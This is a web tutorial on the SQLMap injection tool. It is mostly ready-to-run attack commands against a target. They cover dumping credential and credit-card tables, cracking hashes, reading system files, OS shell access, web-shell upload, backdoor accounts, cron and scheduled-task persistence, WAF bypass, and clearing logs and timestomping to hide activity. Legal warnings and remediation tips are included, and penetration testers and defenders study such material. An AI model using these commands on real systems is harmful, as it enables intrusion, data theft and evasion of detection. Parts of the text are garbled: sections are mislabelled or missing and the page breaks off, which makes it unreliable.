---
lang: en
title: SQLMap Complete Walkthrough
viewport: width=device-width, initial-scale=1.0
---

::: container
<div>

# SQLMap

Advanced SQL Injection Testing Framework

</div>

::: toc
### Table of Contents

-   [Introduction](#introduction)
-   [Installation](#installation)
-   [Basic Usage](#basic-usage)
-   [Detection Techniques](#detection-techniques)
-   [Exploitation Methods](#exploitation-methods)
-   [Database Enumeration](#database-enumeration)
-   [Advanced Features](#advanced-features)
-   [Evasion Techniques](#evasion-techniques)
-   [Automation & Scripting](#automation)
-   [Post-Exploitation](#post-exploitation)
-   [Troubleshooting](#troubleshooting)
-   [Best Practices](#best-practices)
:::

::: {#introduction .section .section}
## Introduction to SQLMap

SQLMap is an open-source penetration testing tool that automates the
process of detecting and exploiting SQL injection flaws. It\'s
considered the de facto standard for SQL injection testing worldwide.

::: feature-grid
::: feature-card
### Automatic Detection

Identifies SQL injection vulnerabilities across multiple database types
with intelligent fingerprinting.

::: technique-badge
Time-based
:::

::: technique-badge
Boolean-based
:::

::: technique-badge
Error-based
:::
:::

::: feature-card
### Database Support

Supports 20+ database management systems including MySQL, PostgreSQL,
Oracle, MSSQL, and SQLite.

::: technique-badge
MySQL
:::

::: technique-badge
PostgreSQL
:::

::: technique-badge
MSSQL
:::
:::

::: feature-card
### Advanced Features

File system access, OS command execution, Windows registry manipulation,
and more.

::: technique-badge
File Upload
:::

::: technique-badge
OS Shell
:::

::: technique-badge
Registry
:::
:::

::: feature-card
### Evasion Techniques

Built-in tamper scripts to bypass WAFs, IDS/IPS, and other security
mechanisms.

::: technique-badge
WAF Bypass
:::

::: technique-badge
Encoding
:::

::: technique-badge
Obfuscation
:::
:::
:::

::: {.warning .risk-high}
**⚠️ Legal Warning:** SQLMap is a powerful penetration testing tool.
Only use it on systems you own or have explicit written permission to
test. Unauthorized use may violate laws and result in serious legal
consequences.
:::
:::

::: {#installation .section .section}
## Installation Guide

### System Requirements

-   Python 3.6+ (recommended 3.8+)
-   Internet connection for updates
-   Administrative privileges for some features

### Installation Methods

#### Method 1: Git Installation (Recommended)

::: terminal-window
::: terminal-header
::: terminal-buttons
::: {.terminal-button .close}
:::

::: {.terminal-button .minimize}
:::

::: {.terminal-button .maximize}
:::
:::

[Terminal - SQLMap
Installation]{style="color: #ccc; margin-left: 10px;"}
:::

::: terminal-content
<div>

[root@kali]{style="color: #ff0080;"}[:\~#]{style="color: #00ff41;"} git
clone \--depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

</div>

<div>

[root@kali]{style="color: #ff0080;"}[:\~#]{style="color: #00ff41;"} cd
sqlmap-dev

</div>

<div>

[root@kali]{style="color: #ff0080;"}[:\~#]{style="color: #00ff41;"}
python sqlmap.py \--version

</div>

::: {style="color: #ffff00; margin-top: 10px;"}
sqlmap/1.7.12#stable
:::
:::
:::

#### Method 2: Package Installation

::: code-block
    # Conservative scan (default)
    python sqlmap.py -u "http://target.com/page?id=1" --level=1 --risk=1

    # Moderate scan (recommended)
    python sqlmap.py -u "http://target.com/page?id=1" --level=3 --risk=2

    # Aggressive scan (use with caution)
    python sqlmap.py -u "http://target.com/page?id=1" --level=5 --risk=3

    # Custom detection
    python sqlmap.py -u "http://target.com/page?id=1" --level=4 --risk=2 --technique=BEUST
:::

### Parameter Testing

::: {.attack-vector .risk-medium}
#### Testing Specific Parameters

::: code-block
    # Test specific parameter
    python sqlmap.py -u "http://target.com/page?id=1&cat=news" -p "id"

    # Test multiple parameters
    python sqlmap.py -u "http://target.com/page?id=1&cat=news" -p "id,cat"

    # Skip specific parameters
    python sqlmap.py -u "http://target.com/page?id=1&cat=news" --skip="cat"

    # Test POST parameters
    python sqlmap.py -u "http://target.com/login" --data="user=admin&pass=test" -p "user"
:::
:::
:::

::: {#exploitation-methods .section .section}
## Exploitation Methods

### HTTP Request Methods

::: feature-grid
::: feature-card
#### GET Requests

::: code-block
    python sqlmap.py -u "http://target.com/page?id=1"
:::
:::

::: feature-card
#### POST Requests

::: code-block
    python sqlmap.py -u "http://target.com/login" \
      --data "username=admin&password=test"
:::
:::

::: feature-card
#### Cookie Testing

::: code-block
    python sqlmap.py -u "http://target.com/page" \
      --cookie "PHPSESSID=abc123; id=1*"
:::
:::

::: feature-card
#### Header Injection

::: code-block
    python sqlmap.py -u "http://target.com/page" \
      --headers "X-Forwarded-For: 127.0.0.1*"
:::
:::
:::

### Request File Testing

::: {.attack-vector .risk-high}
#### Using Saved HTTP Requests

::: code-block
    # Capture request with Burp Suite or similar
    # Save to file (e.g., request.txt)

    # Example request file content:
    POST /login HTTP/1.1
    Host: target.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27
    Cookie: PHPSESSID=abc123

    username=admin&password=test

    # Test the saved request
    python sqlmap.py -r request.txt

    # Test specific parameter in request file
    python sqlmap.py -r request.txt -p "username"
:::
:::

### Advanced Request Handling

::: code-block
    # Custom User-Agent
    python sqlmap.py -u "http://target.com/page?id=1" \
      --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # Random User-Agent
    python sqlmap.py -u "http://target.com/page?id=1" --random-agent

    # HTTP Authentication
    python sqlmap.py -u "http://target.com/page?id=1" \
      --auth-type Basic --auth-cred "admin:password"

    # Proxy Usage
    python sqlmap.py -u "http://target.com/page?id=1" \
      --proxy "http://127.0.0.1:8080"

    # Ignore HTTP errors
    python sqlmap.py -u "http://target.com/page?id=1" --ignore-code=404
:::

### Session Handling

::: code-block
    # Resume previous session
    python sqlmap.py -u "http://target.com/page?id=1" --resume

    # Custom session file
    python sqlmap.py -u "http://target.com/page?id=1" \
      --session-file="/tmp/session.sqlite"

    # Flush session
    python sqlmap.py -u "http://target.com/page?id=1" --flush-session
:::
:::

::: {#database-enumeration .section .section}
## Database Enumeration

### Information Gathering Workflow

::: {.attack-vector .risk-medium}
#### Step-by-Step Enumeration

::: terminal-window
::: terminal-header
::: terminal-buttons
::: {.terminal-button .close}
:::

::: {.terminal-button .minimize}
:::

::: {.terminal-button .maximize}
:::
:::

[SQLMap Enumeration Sequence]{style="color: #ccc; margin-left: 10px;"}
:::

::: terminal-content
<div>

[\# Step 1: Basic Info]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"http://target.com/page?id=1\" \--banner
\--current-user \--current-db

</div>

\

<div>

[\# Step 2: List Databases]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"http://target.com/page?id=1\" \--dbs

</div>

\

<div>

[\# Step 3: List Tables]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"http://target.com/page?id=1\" -D database_name
\--tables

</div>

\

<div>

[\# Step 4: List Columns]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"http://target.com/page?id=1\" -D database_name -T
table_name \--columns

</div>

\

<div>

[\# Step 5: Dump Data]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"http://target.com/page?id=1\" -D database_name -T
table_name \--dump

</div>
:::
:::
:::

### Database Information Commands

  Command           Description                 Example
  ----------------- --------------------------- -----------------
  \--banner         Database version banner     \--banner
  \--current-user   Current database user       \--current-user
  \--current-db     Current database name       \--current-db
  \--hostname       Database server hostname    \--hostname
  \--is-dba         Check if user is DBA        \--is-dba
  \--users          Enumerate all users         \--users
  \--passwords      Enumerate user passwords    \--passwords
  \--privileges     Enumerate user privileges   \--privileges

### Database Structure Enumeration

::: code-block
    # List all databases
    python sqlmap.py -u "http://target.com/page?id=1" --dbs

    # List tables in specific database
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" --tables

    # List columns in specific table
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --columns

    # Get table schema
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --schema

    # Count table entries
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --count
:::

### Data Extraction

::: {.attack-vector .risk-high}
#### Dump Strategies

::: code-block
    # Dump entire table
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --dump

    # Dump specific columns
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
      -C "username,password" --dump

    # Dump with conditions
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
      --dump --where "id>1 AND role='admin'"

    # Dump first/last entries
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
      --dump --start=1 --stop=10

    # Dump all databases (dangerous)
    python sqlmap.py -u "http://target.com/page?id=1" --dump-all --exclude-sysdbs
:::
:::

### Password Hash Analysis

::: code-block
    # Identify hash formats
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
      -C "password" --dump --identify-hash

    # Crack password hashes
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
      -C "password" --dump --crack --wordlist=/usr/share/wordlists/rockyou.txt

    # Custom cracking options
    python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
      -C "password" --dump --crack --hash-format=MD5 --attack-method=dictionary
:::

::: info
**ℹ️ Hash Cracking:** SQLMap can automatically identify common hash
formats (MD5, SHA1, SHA256) and attempt to crack them using dictionary
attacks with popular wordlists.
:::
:::

::: {#advanced-features .section .section}
## Advanced Features

### File System Operations

::: {.attack-vector .risk-high}
#### File System Access

::: code-block
    # Read system files
    python sqlmap.py -u "http://target.com/page?id=1" --file-read="/etc/passwd"

    # Write files to system
    python sqlmap.py -u "http://target.com/page?id=1" \
      --file-write="shell.php" --file-dest="/var/www/html/shell.php"

    # Upload binary files
    python sqlmap.py -u "http://target.com/page?id=1" \
      --file-write="payload.exe" --file-dest="C:\\temp\\payload.exe"

    # Common target files
    # Linux: /etc/passwd, /etc/shadow, /var/log/apache2/access.log
    # Windows: C:\\Windows\\System32\\config\\SAM, C:\\boot.ini
    # Web: ../../../etc/passwd, config.php, wp-config.php
:::
:::

### Operating System Shell Access

::: {.attack-vector .risk-high}
#### Command Execution

::: terminal-window
::: terminal-header
::: terminal-buttons
::: {.terminal-button .close}
:::

::: {.terminal-button .minimize}
:::

::: {.terminal-button .maximize}
:::
:::

[OS Shell Access]{style="color: #ccc; margin-left: 10px;"}
:::

::: terminal-content
<div>

[root@kali]{style="color: #ff0080;"}[:\~#]{style="color: #00ff41;"}
python sqlmap.py -u \"http://target.com/page?id=1\" \--os-shell

</div>

::: {style="color: #ffff00; margin-top: 5px;"}
\[INFO\] testing if the target URL content is stable
:::

::: {style="color: #ffff00;"}
\[INFO\] target URL content is stable
:::

::: {style="color: #ffff00;"}
\[INFO\] fingerprinting the back-end DBMS operating system
:::

::: {style="color: #ffff00;"}
\[INFO\] the back-end DBMS operating system is Linux
:::

::: {style="color: #ffff00;"}
\[INFO\] trying to upload the file stager on \'/var/www/\' via LIMIT
\'LINES TERMINATED BY\' method
:::

::: {style="color: #00ff41; margin-top: 10px;"}
os-shell\> whoami
:::

::: {style="color: #ccc;"}
www-data
:::

::: {style="color: #00ff41;"}
os-shell\> uname -a
:::

::: {style="color: #ccc;"}
Linux target 4.15.0-142-generic #146-Ubuntu SMP x86_64 GNU/Linux
:::
:::
:::

::: code-block
    # Get OS shell
    python sqlmap.py -u "http://target.com/page?id=1" --os-shell

    # Execute single OS command
    python sqlmap.py -u "http://target.com/page?id=1" --os-cmd="whoami"

    # PowerShell on Windows
    python sqlmap.py -u "http://target.com/page?id=1" --os-pwn
:::
:::

### Windows Registry Access

::: code-block
    # Read registry key
    python sqlmap.py -u "http://target.com/page?id=1" \
      --reg-read --reg-key "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"

    # Add registry key
    python sqlmap.py -u "http://target.com/page?id=1" \
      --reg-add --reg-key "HKLM\\SOFTWARE\\Test" --reg-value "TestKey" --reg-data "TestData"

    # Delete registry key
    python sqlmap.py -u "http://target.com/page?id=1" \
      --reg-del --reg-key "HKLM\\SOFTWARE\\Test" --reg-value "TestKey"
:::

### Database-Specific Features

::: feature-grid
::: feature-card
#### MySQL Features

::: code-block
    # UDF injection
    python sqlmap.py -u "target" --udf-inject

    # MySQL privilege escalation
    python sqlmap.py -u "target" --priv-esc
:::
:::

::: feature-card
#### MSSQL Features

::: code-block
    # xp_cmdshell enable
    python sqlmap.py -u "target" --os-shell

    # MSSQL crawling
    python sqlmap.py -u "target" --crawl=2
:::
:::

::: feature-card
#### Oracle Features

::: code-block
    # Oracle SID enumeration
    python sqlmap.py -u "target" --banner

    # Tablespace info
    python sqlmap.py -u "target" --schema
:::
:::

::: feature-card
#### PostgreSQL Features

::: code-block
    # Copy from/to files
    python sqlmap.py -u "target" --file-read="/etc/passwd"

    # Large object support
    python sqlmap.py -u "target" --file-write="shell.php"
:::
:::
:::
:::

::: {#evasion-techniques .section .section}
## Evasion Techniques

### WAF Bypass Strategies

::: {.attack-vector .risk-high}
#### Tamper Scripts

::: code-block
    # List available tamper scripts
    python sqlmap.py --list-tampers

    # Common WAF bypass tampers
    python sqlmap.py -u "http://target.com/page?id=1" \
      --tamper=between,randomcase,space2comment

    # CloudFlare bypass
    python sqlmap.py -u "http://target.com/page?id=1" \
      --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes

    # ModSecurity bypass
    python sqlmap.py -u "http://target.com/page?id=1" \
      --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
:::
:::

### Popular Tamper Scripts

  Tamper Script     Purpose                        Example Transformation
  ----------------- ------------------------------ -----------------------------
  space2comment     Replace spaces with comments   SELECT/\*\*/FROM/\*\*/users
  randomcase        Randomize character case       SeLeCt \* FrOm UsErS
  between           Replace equals with BETWEEN    id BETWEEN 1 AND 1
  charencode        URL encode characters          %53%45%4C%45%43%54
  base64encode      Base64 encode payload          U0VMRUNUKg==
  equaltolike       Replace = with LIKE            username LIKE \'admin\'
  space2plus        Replace spaces with +          SELECT+\*+FROM+users
  unionalltounion   Replace UNION ALL with UNION   UNION SELECT

### Request Manipulation

::: code-block
    # Custom delay between requests
    python sqlmap.py -u "http://target.com/page?id=1" --delay=3

    # Random delay (1-3 seconds)
    python sqlmap.py -u "http://target.com/page?id=1" --delay=1 --timeout=3

    # Reduce thread count
    python sqlmap.py -u "http://target.com/page?id=1" --threads=1

    # HTTP parameter pollution
    python sqlmap.py -u "http://target.com/page?id=1" --hpp

    # Skip URL encoding
    python sqlmap.py -u "http://target.com/page?id=1" --skip-urlencode
:::

### Advanced Evasion

::: {.attack-vector .risk-medium}
#### Chunked Transfer and Mobile Agents

::: code-block
    # Chunked transfer encoding
    python sqlmap.py -u "http://target.com/page?id=1" --chunked

    # Mobile User-Agent
    python sqlmap.py -u "http://target.com/page?id=1" \
      --mobile --random-agent

    # Custom payload encoding
    python sqlmap.py -u "http://target.com/page?id=1" \
      --tamper=charencode --level=3 --risk=2

    # Tor proxy for anonymity
    python sqlmap.py -u "http://target.com/page?id=1" \
      --tor --tor-port=9050 --check-tor
:::
:::

### Custom Tamper Script Example

::: code-block
    # Create custom tamper script
    # File: custom_tamper.py
    #!/usr/bin/env python

    from lib.core.enums import PRIORITY

    __priority__ = PRIORITY.LOW

    def dependencies():
        pass

    def tamper(payload, **kwargs):
        """
        Custom tamper script example
        Replace spaces with /**/ comments and randomize case
        """
        if payload:
            payload = payload.replace(" ", "/**/")
            payload = "".join(char.upper() if i % 2 else char.lower() 
                             for i, char in enumerate(payload))
        return payload

    # Use custom tamper script
    python sqlmap.py -u "http://target.com/page?id=1" \
      --tamper=/path/to/custom_tamper.py
:::
:::

::: {#automation .section .section}
## Automation & Scripting

### Batch Testing with Lists

::: {.attack-vector .risk-medium}
#### Mass Scanning

::: code-block
    # Test multiple URLs from file
    python sqlmap.py -m urls.txt --batch --random-agent

    # Google dorking integration
    python sqlmap.py -g "inurl:php?id=" --random-agent --batch

    # Crawling and testing
    python sqlmap.py -u "http://target.com" --crawl=3 --batch

    # Sitemap parsing
    python sqlmap.py -u "http://target.com/sitemap.xml" --batch
:::
:::

### Automated Enumeration Script

::: terminal-window
::: terminal-header
::: terminal-buttons
::: {.terminal-button .close}
:::

::: {.terminal-button .minimize}
:::

::: {.terminal-button .maximize}
:::
:::

[auto_sqlmap.sh]{style="color: #ccc; margin-left: 10px;"}
:::

::: terminal-content
    #!/bin/bash
    # Automated SQLMap Testing Script

    TARGET_URL="$1"
    OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"

    if [[ -z "$TARGET_URL" ]]; then
        echo "Usage: $0 "
        exit 1
    fi

    mkdir -p "$OUTPUT_DIR"
    cd "$OUTPUT_DIR"

    # Phase 1: Initial vulnerability check
    echo "[*] Phase 1: Testing for SQL injection..."
    python3 /opt/sqlmap/sqlmap.py -u "$TARGET_URL" --batch --random-agent --level=3 --risk=2 > initial_test.log

    # Phase 2: Database enumeration if vulnerable
    if grep -q "vulnerable" initial_test.log; then
        echo "[+] Vulnerability found! Starting enumeration..."
        
        # Get basic info
        python3 /opt/sqlmap/sqlmap.py -u "$TARGET_URL" --banner --current-user --current-db --batch > basic_info.log
        
        # List databases
        python3 /opt/sqlmap/sqlmap.py -u "$TARGET_URL" --dbs --batch > databases.log
        
        # Extract database names
        DATABASES=$(grep -E '^\[\*\]' databases.log | sed 's/\[\*\] //' | grep -v 'information_schema\|mysql\|performance_schema')
        
        for db in $DATABASES; do
            echo "[*] Enumerating database: $db"
            python3 /opt/sqlmap/sqlmap.py -u "$TARGET_URL" -D "$db" --tables --batch > "${db}_tables.log"
        done
    else
        echo "[-] No SQL injection vulnerability found."
    fi
:::
:::

### Python Integration Script

::: code-block
    #!/usr/bin/env python3
    # SQLMap Python Automation Script

    import subprocess
    import json
    import sys
    import time
    from datetime import datetime

    class SQLMapAutomator:
        def __init__(self, target_url):
            self.target = target_url
            self.sqlmap_path = "/opt/sqlmap/sqlmap.py"
            self.results = {}
            
        def run_sqlmap(self, args):
            """Execute SQLMap with given arguments"""
            cmd = ["python3", self.sqlmap_path, "-u", self.target] + args
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                return result.stdout, result.stderr, result.returncode
            except subprocess.TimeoutExpired:
                return "", "Timeout expired", 1
        
        def test_vulnerability(self):
            """Test for SQL injection vulnerability"""
            print(f"[*] Testing {self.target} for SQL injection...")
            stdout, stderr, code = self.run_sqlmap(["--batch", "--level=3", "--risk=2"])
            
            if "is vulnerable" in stdout:
                print("[+] SQL injection vulnerability detected!")
                self.results["vulnerable"] = True
                return True
            else:
                print("[-] No SQL injection vulnerability found.")
                self.results["vulnerable"] = False
                return False
        
        def enumerate_databases(self):
            """Enumerate available databases"""
            print("[*] Enumerating databases...")
            stdout, stderr, code = self.run_sqlmap(["--dbs", "--batch"])
            
            # Parse database names from output
            databases = []
            lines = stdout.split('\n')
            for line in lines:
                if line.startswith("[*] "):
                    db_name = line.replace("[*] ", "").strip()
                    if db_name not in ["information_schema", "mysql", "performance_schema"]:
                        databases.append(db_name)
            
            self.results["databases"] = databases
            print(f"[+] Found {len(databases)} databases")
            return databases
        
        def generate_report(self):
            """Generate JSON report"""
            report = {
                "target": self.target,
                "timestamp": datetime.now().isoformat(),
                "results": self.results
            }
            
            filename = f"sqlmap_report_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            
            print(f"[+] Report saved to {filename}")

    if __name__ == "__main__":
        if len(sys.argv) != 2:
            print("Usage: python3 sqlmap_auto.py ")
            sys.exit(1)
        
        automator = SQLMapAutomator(sys.argv[1])
        if automator.test_vulnerability():
            automator.enumerate_databases()
        automator.generate_report()
:::

### Configuration Files

::: {.attack-vector .risk-low}
#### SQLMap Configuration

::: code-block
    # Create sqlmap.conf configuration file
    [Target]
    url = http://target.com/page?id=1
    data = 
    cookie = 
    headers = User-Agent: Custom Agent 1.0

    [Request]
    method = GET
    delay = 1
    timeout = 30
    retries = 3
    randomAgent = True
    mobile = False

    [Detection]
    level = 3
    risk = 2
    techniques = BEUST
    dbms = 
    os = 

    [Enumeration]
    getBanner = True
    getCurrentUser = True
    getCurrentDb = True
    getDbs = True
    getTables = True
    getColumns = True
    getUsers = False
    getPasswordHashes = False

    [Brute force]
    commonTables = True
    commonColumns = True

    [File system]
    fileRead = 
    fileWrite = 
    fileDest = 

    [Injection]
    tamper = 
    prefix = 
    suffix = 
    skip = 
    testParameter = 

    [Advanced]
    threads = 1
    verbose = 1
    batch = True
    flushSession = False
    freshQueries = False
    hexConvert = False
    outputDir = /tmp/sqlmap_output

    # Use configuration file
    python sqlmap.py --config=sqlmap.conf
:::
:::
:::

::: {#post-exploitation .section .section}
## Post-Exploitation

### Data Exfiltration Strategies

::: {.attack-vector .risk-high}
#### Sensitive Data Extraction

::: code-block
    # Target sensitive tables
    python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" \
      --sql-query "SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%admin%' OR table_name LIKE '%password%'"

    # Extract user credentials
    python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" -T "users" \
      -C "username,password,email" --dump --where "role='admin'"

    # Search for credit card data
    python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" \
      --sql-query "SELECT * FROM payment_info WHERE cc_number IS NOT NULL LIMIT 10"

    # Extract configuration data
    python sqlmap.py -u "http://target.com/page?id=1" -D "webapp" \
      --sql-query "SELECT * FROM config WHERE config_key LIKE '%api%' OR config_key LIKE '%secret%'"
:::
:::

### Privilege Escalation

::: code-block
    # Check current user privileges
    python sqlmap.py -u "http://target.com/page?id=1" --privileges

    # Check if current user is DBA
    python sqlmap.py -u "http://target.com/page?id=1" --is-dba

    # Attempt privilege escalation (MySQL)
    python sqlmap.py -u "http://target.com/page?id=1" --priv-esc

    # UDF injection for root access
    python sqlmap.py -u "http://target.com/page?id=1" --udf-inject --shared-lib=/tmp/lib_mysqludf_sys.so
:::

### Persistence Mechanisms

::: {.attack-vector .risk-high}
#### Maintaining Access

::: terminal-window
::: terminal-header
::: terminal-buttons
::: {.terminal-button .close}
:::

::: {.terminal-button .minimize}
:::

::: {.terminal-button .maximize}
:::
:::

[Persistence Techniques]{style="color: #ccc; margin-left: 10px;"}
:::

::: terminal-content
<div>

[\# 1. Web shell upload]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"target\" \--file-write=\"webshell.php\"
\--file-dest=\"/var/www/html/admin/shell.php\"

</div>

\

<div>

[\# 2. Create backdoor user (MySQL)]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"target\" \--sql-query \"CREATE USER
\'backdoor\'@\'%\' IDENTIFIED BY \'P@ssw0rd123\'\"

</div>

<div>

python sqlmap.py -u \"target\" \--sql-query \"GRANT ALL PRIVILEGES ON
\*.\* TO \'backdoor\'@\'%\'\"

</div>

\

<div>

[\# 3. Scheduled task creation (Windows)]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"target\" \--os-cmd \"schtasks /create /tn Updater
/tr C:\\\\temp\\\\payload.exe /sc daily\"

</div>

\

<div>

[\# 4. Cron job (Linux)]{style="color: #00ffff;"}

</div>

<div>

python sqlmap.py -u \"target\" \--os-cmd \"echo \'0 2 \* \* \*
/tmp/backdoor.sh\' \| crontab -\"

</div>
:::
:::
:::

### Log Cleaning and Anti-Forensics

::: code-block
    # Clear MySQL query logs
    python sqlmap.py -u "http://target.com/page?id=1" \
      --sql-query "SET GLOBAL general_log = 'OFF'"

    # Clear web server logs
    python sqlmap.py -u "http://target.com/page?id=1" \
      --os-cmd "echo '' > /var/log/apache2/access.log"

    # Clear Windows event logs
    python sqlmap.py -u "http://target.com/page?id=1" \
      --os-cmd "wevtutil cl System && wevtutil cl Security && wevtutil cl Application"

    # Timestomp files (modify timestamps)
    python sqlmap.py -u "http://target.com/page?id=1" \
      --os-cmd "touch -r /etc/passwd /tmp/uploaded_file.txt"
:::

::: {.warning .risk-high}
**⚠️ Legal Notice:** Post-exploitation activities must only be performed
on systems you own or have explicit written authorization to test. Log
cleaning and persistence mechanisms are serious security violations if
performed without proper authorization.
:::
:::

::: {#troubleshooting .section .section}
## Troubleshooting

### Common Issues and Solutions

::: feature-grid
::: feature-card
#### Connection Problems

::: code-block
    # SSL certificate issues
    python sqlmap.py -u "https://target.com/page?id=1" --disable-coloring --force-ssl

    # Timeout problems
    python sqlmap.py -u "target" --timeout=60 --retries=5

    # Proxy configuration
    python sqlmap.py -u "target" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
:::
:::

::: feature-card
#### WAF Detection

::: code-block
    # Identify WAF
    python sqlmap.py -u "target" --identify-waf

    # Bypass common WAFs
    python sqlmap.py -u "target" --tamper=space2comment,randomcase

    # Skip WAF detection
    python sqlmap.py -u "target" --skip-waf
:::
:::

::: feature-card
#### False Positives

::: code-block
    # Verify injection point
    python sqlmap.py -u "target" --string="Welcome" --not-string="Error"

    # Text-only responses
    python sqlmap.py -u "target" --text-only

    # Custom regex filtering
    python sqlmap.py -u "target" --regexp="[a-zA-Z0-9]+"
:::
:::

::: feature-card
#### Performance Issues

::: code-block
    # Optimize threads
    python sqlmap.py -u "target" --threads=5 --delay=1

    # Resume interrupted sessions
    python sqlmap.py -u "target" --resume

    # Skip static content
    python sqlmap.py -u "target" --skip-static
:::
:::
:::

### Error Messages and Solutions

  Error Message           Cause                             Solution
  ----------------------- --------------------------------- ----------------------------------------------
  Connection timed out    Network issues or rate limiting   \--timeout=60 \--delay=3 \--retries=3
  403 Forbidden           WAF blocking requests             \--tamper=randomcase \--random-agent
  No parameter(s) found   Missing injectable parameters     -p parameter_name or \--data=\"param=value\"
  Unable to connect       Invalid URL or network issue      Check URL format and connectivity
  Detected WAF/IPS        Security system interference      \--tamper=between,randomcase \--delay=5

### Debug and Logging

::: code-block
    # Enable verbose output
    python sqlmap.py -u "http://target.com/page?id=1" -v 6

    # Save all traffic
    python sqlmap.py -u "http://target.com/page?id=1" --save="traffic.log"

    # Debug payload generation
    python sqlmap.py -u "http://target.com/page?id=1" --debug

    # Test single payload
    python sqlmap.py -u "http://target.com/page?id=1" --test-filter="MySQL boolean-based blind"

    # Replay traffic log
    python sqlmap.py -l "traffic.log"
:::

::: info
**ℹ️ Debugging Tips:**

-   Use verbose mode (-v 6) to see all HTTP requests
-   Save traffic logs for analysis and replay
-   Test individual payloads to isolate issues
-   Check SQLMap\'s temp directory for generated files
-   Use Wireshark to capture actual network traffic
:::
:::

::: {#best-practices .section .section}
## Best Practices & Legal Guidelines

### Ethical Testing Framework

::: {.warning .risk-high}
**⚠️ Legal Requirements:**

-   **Written Authorization:** Always obtain explicit written permission
    before testing
-   **Scope Definition:** Clearly define testing boundaries and
    limitations
-   **Data Handling:** Establish protocols for sensitive data discovered
    during testing
-   **Reporting:** Provide detailed findings and remediation
    recommendations
-   **Compliance:** Ensure testing complies with local laws and
    regulations
:::

### Professional Testing Methodology

::: feature-grid
::: feature-card
#### 1. Reconnaissance Phase

::: code-block
    # Identify web technology
    whatweb target.com

    # Check for WAF
    python sqlmap.py -u "target" --identify-waf

    # Initial vulnerability scan
    python sqlmap.py -u "target" --batch --level=1 --risk=1
:::
:::

::: feature-card
#### 2. Testing Phase

::: code-block
    # Comprehensive scan
    python sqlmap.py -u "target" --level=3 --risk=2 --batch

    # Multiple injection techniques
    python sqlmap.py -u "target" --technique=BEUST

    # Custom tamper scripts
    python sqlmap.py -u "target" --tamper=randomcase,space2comment
:::
:::

::: feature-card
#### 3. Exploitation Phase

::: code-block
    # Database enumeration
    python sqlmap.py -u "target" --dbs --tables --columns

    # Sensitive data extraction
    python sqlmap.py -u "target" -D db -T users --dump

    # System access (if authorized)
    python sqlmap.py -u "target" --os-shell
:::
:::

::: feature-card
#### 4. Documentation Phase

::: code-block
    # Generate comprehensive report
    python sqlmap.py -u "target" --batch --output-dir=report/

    # Export findings
    python sqlmap.py -u "target" --dump --csv-del="," > findings.csv

    # Clean up evidence
    python sqlmap.py --purge-output
:::
:::
:::

### Security Recommendations

::: {.attack-vector .risk-medium}
#### Remediation Guidelines

::: success
**✅ Preventive Measures:**

-   **Parameterized Queries:** Use prepared statements and parameterized
    queries
-   **Input Validation:** Implement strict input validation and
    sanitization
-   **Least Privilege:** Database users should have minimal required
    permissions
-   **WAF Implementation:** Deploy Web Application Firewall with SQL
    injection rules
-   **Regular Updates:** Keep database software and frameworks updated
-   **Error Handling:** Implement proper error handling without
    information disclosure
-   **Database Hardening:** Disable unnecessary features and services
-   **Network Security:** Implement proper network segmentation
:::
:::

### Professional Reporting Template

::: code-block
    EXECUTIVE SUMMARY
    ================
    Target: [URL/Application]
    Date: [Testing Date]
    Tester: [Security Professional]
    Authorization: [Reference to written permission]

    VULNERABILITY OVERVIEW
    ======================
    Critical: [Number] - Immediate attention required
    High: [Number] - Should be addressed within 1 week
    Medium: [Number] - Should be addressed within 1 month
    Low: [Number] - Should be addressed as time permits

    TECHNICAL FINDINGS
    ==================
    1. SQL Injection Vulnerability
       Location: [Parameter/URL]
       Method: [GET/POST/Cookie/Header]
       Database: [Type and Version]
       Impact: [Data extraction, system access, etc.]
       
       Proof of Concept:
       [SQLMap command used]
       [Sample output/evidence]
       
       Remediation:
       - Implement parameterized queries
       - Add input validation
       - Apply least privilege principle
       - Deploy WAF rules

    APPENDIX
    ========
    - Full SQLMap output logs
    - Database schema information
    - Extracted sample data (sanitized)
    - Recommended security controls
:::

### Continuous Security Testing

::: {.attack-vector .risk-low}
